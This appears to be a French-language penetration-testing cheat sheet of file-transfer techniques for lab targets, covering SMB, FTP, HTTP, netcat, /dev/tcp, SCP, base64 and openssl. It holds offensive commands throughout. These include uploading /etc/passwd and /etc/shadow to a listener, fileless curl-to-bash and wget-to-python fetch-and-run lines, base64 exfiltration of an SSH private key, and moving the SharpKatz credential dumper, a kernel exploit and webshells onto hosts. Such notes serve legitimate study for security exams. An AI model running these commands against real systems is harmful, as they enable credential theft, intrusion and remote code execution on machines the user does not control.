# Compression
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#compression
tar -zcvf firefox.tar.gz firefox
#décompression
tar -xf firefox.tar.gz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# SMB
Créer un serveur
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
impacket-smbserver -smb2support -username abc -password 123 TMP /home/corsaire/offsec/pen200/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ajouter un partage
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# FTP
Créer un serveur

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# HTTP
Créer un serveur
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Téléchargement seulement
python3 -m http.server 80
#Avec téléversement
python3 -m uploadserver 80
#2.7
python2.7 -m SimpleHTTPServer
#php
php -S 0.0.0.0:8000
#ruby
ruby -run -ehttpd . -p8000
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Avec Apache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo systemctl start apache2
sudo cp <fichier_a_copier> /var/www/html/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
busybox
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
busybox httpd -f -p 8080
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Avec certificat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
#téléchargement
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Infiltration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
wget http://192.168.45.196/unix-privesc-check
#pour exécuter
chmod +x unix-privesc-check
#fileless
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# BASH >=2.04(HTTP)
compilé avec --enable-net-redirections

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#connexion
Corsaire@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
#GET
Corsaire@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
#Lecture
Corsaire@htb[/htb]$ cat <&3
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# SCP/SSH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo systemctl start ssh
#vérifier
netstat -lnpt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
scp cve-2017-16995.c joe@192.168.123.216:
#Attention le chemin est toujours à la racine.
scp -P 2222 -r -i web01/anita_id_ecdsa anita@192.168.193.246:/var/www demo
scp -P 2222 -r -i web01/anita_id_ecdsa /usr/share/webshells/php/ anita@192.168.193.246:/home/anita
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Base64
Attraper avec NC
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#encoder
base64 shell -w 0
cat id_rsa |base64 -w 0;echo
#décoder
echo -n 'LS0...o=' | base64 -d > shell
#vérifier
md5sum shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Netcat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#écoute
nc -l -p 8000 > SharpKatz.exe
#Si on envoi depuis netcat, ferme automatiquement à la fin de l'envoi
nc -l -p 8000 --recv-only > SharpKatz.exe
#envoi
nc --send-only 192.168.49.128 8000 < SharpKatz.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Si on préfère attendre une connexion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Attendre une connexion et envoyer fichier
sudo nc -l -p 443 --send-only < SharpKatz.exe
#réception
nc 192.168.49.128 443 --recv-only > SharpKatz.exe
#récetion en bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Webdav (SMB/HTTP)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Living off the land
https://gtfobins.github.io/
utiliser +file download ou +file upload dans la recherche

# Encryption

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
#decrypte
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


